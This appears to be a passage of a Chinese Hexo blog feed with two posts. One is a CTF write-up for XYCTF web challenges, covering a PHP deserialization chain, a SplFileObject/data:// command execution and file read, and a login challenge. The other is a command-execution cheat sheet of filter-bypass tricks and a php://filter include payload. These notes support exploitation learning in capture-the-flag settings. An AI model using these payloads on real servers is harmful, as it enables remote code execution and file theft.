class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">// flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO1</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Liu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$T1ng</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$upsw1ng</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$Liu</span>, <span class="hljs-variable">$T1ng</span>, <span class="hljs-variable">$upsw1ng</span> = Showmaker</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;Liu = <span class="hljs-variable">$Liu</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;T1ng = <span class="hljs-variable">$T1ng</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;upsw1ng = <span class="hljs-variable">$upsw1ng</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO2</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$crypto0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$adwa</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$crypto0</span>, <span class="hljs-variable">$adwa</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;crypto0 = <span class="hljs-variable">$crypto0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">XYCTF</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;adwa-&gt;crypto0 != <span class="hljs-string">&#x27;dev1l&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;adwa-&gt;T1ng != <span class="hljs-string">&#x27;yuroandCMD258&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> False;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> True;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO3</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$KickyMu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fpclose</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$N1ght</span> = <span class="hljs-string">&quot;Crypto0&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$KickyMu</span>, <span class="hljs-variable">$fpclose</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;KickyMu = <span class="hljs-variable">$KickyMu</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;fpclose = <span class="hljs-variable">$fpclose</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">XY</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;N1ght == <span class="hljs-string">&#x27;oSthing&#x27;</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;WOW, You web is really good!!!\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;X&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Y&#x27;</span>]);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;KickyMu-&gt;<span class="hljs-title function_ invoke__">XYCTF</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">XY</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;CTF&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;CTF&#x27;</span>]);<br>&#125; <br></code></pre></td></tr></table></figure><p>好多出题人被扒上面啊，该打呜呜呜。</p><p>看了一遍好难，原生链和利用链，跟着师傅的思路跑一遍。</p><p>？写多了我感觉也不是太难了，上代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO1</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Liu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$T1ng</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$upsw1ng</span>; <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO2</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$crypto0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$adwa</span>; <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XYCTFNO3</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$KickyMu</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fpclose</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$N1ght</span> = <span class="hljs-string">&quot;Crypto0&quot;</span>; <br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XYCTFNO3</span>;<br><span class="hljs-variable">$a</span>-&gt;N1ght=<span class="hljs-string">&#x27;oSthing&#x27;</span>;<br><span class="hljs-variable">$a</span>-&gt;KickyMu=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XYCTFNO2</span>;<br><span class="hljs-variable">$a</span>-&gt;KickyMu-&gt;adwa=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XYCTFNO1</span>;<br><span class="hljs-variable">$a</span>-&gt;KickyMu-&gt;adwa-&gt;T1ng=<span class="hljs-string">&#x27;yuroandCMD258&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>这里注意有private，需要%00填上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">$this-&gt;adwa-&gt;crypto0 != &#x27;dev1l&#x27;的原因还需要添s:7:&quot;crypto0&quot;;s:5:&quot;dev1l&quot;;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?CTF=O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;XYCTFNO3&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;KickyMu&quot;</span>;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;XYCTFNO2&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;crypto0&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;adwa&quot;</span>;O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;XYCTFNO1&quot;</span>:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;Liu&quot;</span>;N;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;T1ng&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;yuroandCMD258&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;%00XYCTFNO1%00upsw1ng&quot;</span>;N;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;crypto0&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;dev1l&quot;</span>;&#125;&#125;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;fpclose&quot;</span>;N;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;N1ght&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;oSthing&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>post里面y肯定是构造伪协议这没什么问题，x的话我就不太懂了，<a href="https://blog.csdn.net/weixin_39534780/article/details/115514259?ops_request_misc=&request_id=&biz_id=102&utm_term=SplFileObject&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-115514259.nonecase&spm=1018.2226.3001.4187">文章</a>，简要了解一下，类似file_get_contents，这里前面有new,可以用Splfileobject使用，确实长知识了。</p><p><img src="/../images/xyctf/ser2.png" alt="ser2"></p><p><img src="/../images/xyctf/ser3.png" alt="ser3"></p><h2 id="ezClass"><a href="#ezClass" class="headerlink" title="ezClass"></a>ezClass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$aa</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aa&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-variable">$bb</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bb&#x27;</span>];<br><span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>((<span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$aa</span>))-&gt;<span class="hljs-variable">$c</span>())((<span class="hljs-keyword">new</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$bb</span>))-&gt;<span class="hljs-variable">$c</span>());<br></code></pre></td></tr></table></figure><p>看了一下wp也是考的Spl原生类+伪协议利用，确实之前不知道这些。</p><p>?a&#x3D;SplFileObject&amp;aa&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,system&amp;c&#x3D;__toString&amp;b&#x3D;SplFileObject&amp;bb&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,cat%20&#x2F;flag</p><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>没遇过的知识点，可以看看，<a href="https://xz.aliyun.com/t/14061?time__1311=mqmx9DBG0Qi=oGNDQiiQGkfD8QaR10B4OiD&alichlgref=https://cn.bing.com/">前置知识</a></p><p>之后可以看官p,太难了技术有限。就到这里了。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>复盘</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web之命令执行(持续更新)</title>
    <link href="/2024/04/13/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2024/04/13/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h1><p>system<br>passthru<br>exec<br>show_source</p><h1 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h1><p>%09(tab)<br>$IFS$9<br>${IFS}<br>$IFS%09(tab)<br>&lt;(不能和通配符一起使用)<br>&lt;&gt;(不能和通配符一起使用)<br>%20(space)</p><h1 id="无字符绕过"><a href="#无字符绕过" class="headerlink" title="无字符绕过"></a>无字符绕过</h1><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>第一种姿势利用poc文件上传，通过.&#x2F;tmp&#x2F;php??????这样的形式来写<br>通配符除了？和*之外还有[^x]可以使用，一般默认上传的最后一个字母是大写字母，可以用[ @-[ ]进行遍历<br>然后进行修改内容，可以先尝试whoami看看是否RCE成功，需要在#！&#x2F;bin&#x2F;sh下进行(我暂时还不太懂);然后ls看看，最后cat或者tac flag ,直接不行的情况下，可以在默认目录下(var&#x2F;www&#x2F;html&#x2F;XXX)<br>附上poc代码:</p><p><img src="/../../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/poc.png"></p><p>算是第一次接触到这种姿势，记录一下.</p><h2 id="构造数字"><a href="#构造数字" class="headerlink" title="$()构造数字"></a>$()构造数字</h2><p>在linux中,echo $(())默认为0，取反就是-1，也就是$((~ $(())))&#x3D;-1；<br>因为是默认相加构造负数最后整体相加即可。</p><h1 id="include包含"><a href="#include包含" class="headerlink" title="include包含"></a>include包含</h1><p>include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>include函数传入的参数不能执行系统命令，需要使用伪协议</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>命令执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
